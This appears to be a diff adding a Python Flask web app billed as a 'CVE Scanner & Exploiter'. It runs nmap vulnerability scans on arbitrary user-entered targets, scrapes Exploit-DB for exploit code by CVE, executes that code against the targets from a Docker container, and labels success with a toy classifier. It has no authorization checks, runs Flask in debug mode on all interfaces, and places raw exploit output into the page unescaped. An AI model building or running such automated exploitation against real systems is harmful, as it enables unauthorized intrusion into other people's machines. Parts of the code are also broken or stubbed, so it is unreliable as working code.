@@ -1,0 +1,341 @@
+import os
+import re
+import json
+import random
+import subprocess
+from datetime import datetime
+from threading import Thread
+
+from flask import Flask, request, jsonify, render_template_string
+import requests
+from bs4 import BeautifulSoup
+import nmap
+
+from sklearn.feature_extraction.text import TfidfVectorizer
+from sklearn.linear_model import LogisticRegression
+import joblib
+
+app = Flask(__name__)
+
+# ----------------------------
+# Banner & Web UI Template
+# ----------------------------
+BANNER_TEXT = "YURI08loveELAINA"
+BANNER_COLORS = ["red", "green", "yellow", "blue", "magenta", "cyan"]
+
+def get_colored_banner():
+    color = random.choice(BANNER_COLORS)
+    return f'<span style="color:{color}; font-weight:bold;">{BANNER_TEXT}</span>'
+
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>YURI08 CVE Scanner & Exploiter</title>
+<style>
+  body {
+    background: url('https://i.imgur.com/wlHjQyD.jpg') no-repeat center center fixed;
+    background-size: cover;
+    color: white;
+    font-family: Arial, sans-serif;
+    margin: 0; padding: 0;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+  header {
+    padding: 1rem;
+    font-size: 2rem;
+    font-weight: bold;
+    text-align: center;
+  }
+  #banner { font-weight: bold; }
+  main {
+    flex-grow: 1;
+    padding: 1rem;
+    background-color: rgba(0,0,0,0.5);
+  }
+  footer {
+    text-align: center;
+    padding: 0.5rem;
+    background-color: rgba(0,0,0,0.7);
+    font-size: 0.9rem;
+  }
+  button {
+    background: #4CAF50;
+    border: none;
+    padding: 0.6rem 1.2rem;
+    color: white;
+    cursor: pointer;
+    font-size: 1rem;
+    margin-top: 1rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 1rem;
+  }
+  th, td {
+    border: 1px solid white;
+    padding: 0.5rem;
+    text-align: left;
+    vertical-align: top;
+  }
+  th {
+    background: rgba(255,255,255,0.2);
+  }
+  pre {
+    white-space: pre-wrap;
+    max-height: 100px;
+    overflow: auto;
+    margin: 0;
+  }
+</style>
+<script>
+async function startScan() {
+  const cvesInput = document.getElementById('cves').value;
+  const targetsInput = document.getElementById('targets').value;
+  const cves = cvesInput.split(',').map(s => s.trim()).filter(Boolean);
+  const targets = targetsInput.split(',').map(s => s.trim()).filter(Boolean);
+  if(targets.length === 0) {
+    alert("Please input at least one target IP/domain.");
+    return;
+  }
+  document.getElementById('results').innerHTML = 'Scanning... Please wait.';
+  const resp = await fetch('/api/v1/scan', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({cves, targets})
+  });
+  const data = await resp.json();
+  if(data.error) {
+    document.getElementById('results').innerText = data.error;
+    return;
+  }
+  let html = '<table><tr><th>Target</th><th>CVE</th><th>Success</th><th>Output</th><th>Timestamp</th></tr>';
+  data.results.forEach(r => {
+    html += `<tr>
+      <td>${r.target}</td>
+      <td>${r.cve}</td>
+      <td style="color:${r.success ? 'lightgreen':'red'}">${r.success}</td>
+      <td><pre>${r.output}</pre></td>
+      <td>${r.timestamp}</td>
+    </tr>`;
+  });
+  html += '</table>';
+  document.getElementById('results').innerHTML = html;
+}
+
+// Banner color rotate
+function changeBannerColor() {
+  const colors = ["red","green","yellow","blue","magenta","cyan"];
+  const banner = document.getElementById('banner');
+  const color = colors[Math.floor(Math.random() * colors.length)];
+  banner.style.color = color;
+}
+setInterval(changeBannerColor, 700);
+</script>
+</head>
+<body>
+<header><div id="banner">{{ banner|safe }}</div></header>
+<main>
+  <h2>Scan & Exploit CVE</h2>
+  <label for="cves">CVE IDs (comma separated, empty = auto from target):</label><br>
+  <input type="text" id="cves" style="width: 100%;" placeholder="e.g. CVE-2021-44228,CVE-2019-0708" /><br><br>
+  <label for="targets">Target IPs/Domains (comma separated):</label><br>
+  <input type="text" id="targets" style="width: 100%;" placeholder="e.g. 192.168.1.5,example.com" /><br>
+  <button onclick="startScan()">Start Scan & Exploit</button>
+  <div id="results" style="margin-top:1rem;"></div>
+</main>
+<footer>coding by YURI08</footer>
+</body>
+</html>
+"""
+
+# ----------------------------
+# ML model train/load
+# ----------------------------
+MODEL_FILE = "exploit_model.pkl"
+
+def train_ml_model():
+    logs = [
+        "exploit success shell spawned",
+        "error fail denied",
+        "access granted exploit done",
+        "failed to connect",
+        "exploit done successfully",
+        "not vulnerable"
+    ]
+    labels = [1, 0, 1, 0, 1, 0]
+
+    vectorizer = TfidfVectorizer()
+    X = vectorizer.fit_transform(logs)
+    model = LogisticRegression()
+    model.fit(X, labels)
+    joblib.dump((vectorizer, model), MODEL_FILE)
+    print("ML model trained and saved.")
+
+def ml_predict_success(exploit_output):
+    if not os.path.exists(MODEL_FILE):
+        train_ml_model()
+    vectorizer, model = joblib.load(MODEL_FILE)
+    X_test = vectorizer.transform([exploit_output])
+    pred = model.predict(X_test)[0]
+    return bool(pred)
+
+# ----------------------------
+# Nmap scan to get CVEs
+# ----------------------------
+def nmap_scan(target_ip):
+    try:
+        nm = nmap.PortScanner()
+        nm.scan(target_ip, arguments='-sV --script vuln')
+        cves_found = []
+        for host in nm.all_hosts():
+            for proto in nm[host].all_protocols():
+                for port in nm[host][proto]:
+                    scripts = nm[host][proto][port].get('script', {})
+                    for output in scripts.values():
+                        cves_found.extend(re.findall(r'CVE-\d{4}-\d{4,7}', output))
+        return list(set(cves_found))
+    except Exception as e:
+        print("Nmap scan error:", e)
+        return []
+
+# ----------------------------
+# Crawl Exploit-DB to get exploit code (real)
+# ----------------------------
+def fetch_exploitdb_code(cve):
+    try:
+        url = f"https://www.exploit-db.com/search?cve={cve}"
+        resp = requests.get(url, timeout=10)
+        soup = BeautifulSoup(resp.text, "html.parser")
+        table = soup.find("table", {"id": "exploits-table"})
+        if not table:
+            return None
+        link = table.find("a", href=True)
+        if not link:
+            return None
+        exploit_url = "https://www.exploit-db.com" + link['href']
+        resp2 = requests.get(exploit_url, timeout=10)
+        soup2 = BeautifulSoup(resp2.text, "html.parser")
+        code = soup2.find("pre", {"id": "code"})
+        if code:
+            return code.text
+    except Exception as e:
+        print(f"Exploit-DB fetch error for {cve}: {e}")
+    return None
+
+# ----------------------------
+# Fallback get exploit from GitHub (demo)
+# ----------------------------
+def fetch_github_exploit(cve):
+    # Demo: giả lập exploit code từ github
+    return f"#!/bin/bash\necho 'Running GitHub exploit for {cve}'\nexit 0\n"
+
+# ----------------------------
+# Run exploit in Docker sandbox
+# ----------------------------
+def run_exploit_docker(exploit_code, target):
+    # Save exploit script
+    script_path = f"/tmp/exploit_{random.randint(1000,9999)}.sh"
+    with open(script_path, "w") as f:
+        f.write(exploit_code)
+    os.chmod(script_path, 0o755)
+
+    # Command to run docker container - bạn phải build image tên 'exploit_sandbox' trước
+    cmd = [
+        "docker", "run", "--rm",
+        "-v", f"{os.path.dirname(script_path)}:/exploit",
+        "exploit_sandbox",
+        "/bin/bash", f"/exploit/{os.path.basename(script_path)}", target
+    ]
+    try:
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+        output = proc.stdout + proc.stderr
+        success = ml_predict_success(output)
+        os.remove(script_path)
+        return output, success
+    except Exception as e:
+        return f"Error running exploit docker: {e}", False
+
+# ----------------------------
+# Main scanning + exploit function
+# ----------------------------
+def scan_and_exploit(cves, targets):
+    results = []
+    for target in targets:
+        if not cves:
+            print(f"No CVEs provided, running nmap vuln scan on {target} ...")
+            cves = nmap_scan(target)
+            print(f"Detected CVEs: {cves}")
+            if not cves:
+                cves = []  # empty fallback
+
+        for cve in cves:
+            # Fetch exploit code
+            exploit_code = fetch_exploitdb_code(cve)
+            if not exploit_code:
+                exploit_code = fetch_github_exploit(cve)
+            if not exploit_code:
+                output = "No exploit code found"
+                success = False
+            else:
+                output, success = run_exploit_docker(exploit_code, target)
+
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            result = {
+                "target": target,
+                "cve": cve,
+                "success": success,
+                "output": output,
+                "timestamp": timestamp
+            }
+            # Save to log file JSON append
+            with open("scan_exploit_log.json", "a") as f:
+                f.write(json.dumps(result) + "\n")
+
+            # Alert console
+            if success:
+                print(f"[ALERT] Exploit succeeded on {target} for {cve}")
+            else:
+                print(f"[INFO] Exploit failed or no code on {target} for {cve}")
+
+            results.append(result)
+    return results
+
+# ----------------------------
+# Flask routes
+# ----------------------------
+@app.route("/")
+def index():
+    banner = get_colored_banner()
+    return render_template_string(HTML_TEMPLATE, banner=banner)
+
+@app.route("/api/v1/scan", methods=["POST"])
+def api_scan():
+    data = request.json
+    if not data:
+        return jsonify({"error": "Missing JSON body"}), 400
+    targets = data.get("targets", [])
+    cves = data.get("cves", [])
+    if not targets:
+        return jsonify({"error": "No targets provided"}), 400
+
+    # Run scan and exploit in thread to not block web
+    def worker():
+        scan_and_exploit(cves, targets)
+    Thread(target=worker).start()
+
+    # Return immediately, real result will be in logs / UI refresh manually
+    return jsonify({"results": [], "message": "Scan started in background, check logs."})
+
+# ----------------------------
+# Main run
+# ----------------------------
+if __name__ == "__main__":
+    print("Starting CVE Scanner & Exploiter...")
+    if not os.path.exists(MODEL_FILE):
+        train_ml_model()
+    app.run(host="0.0.0.0", port=5000, debug=True)
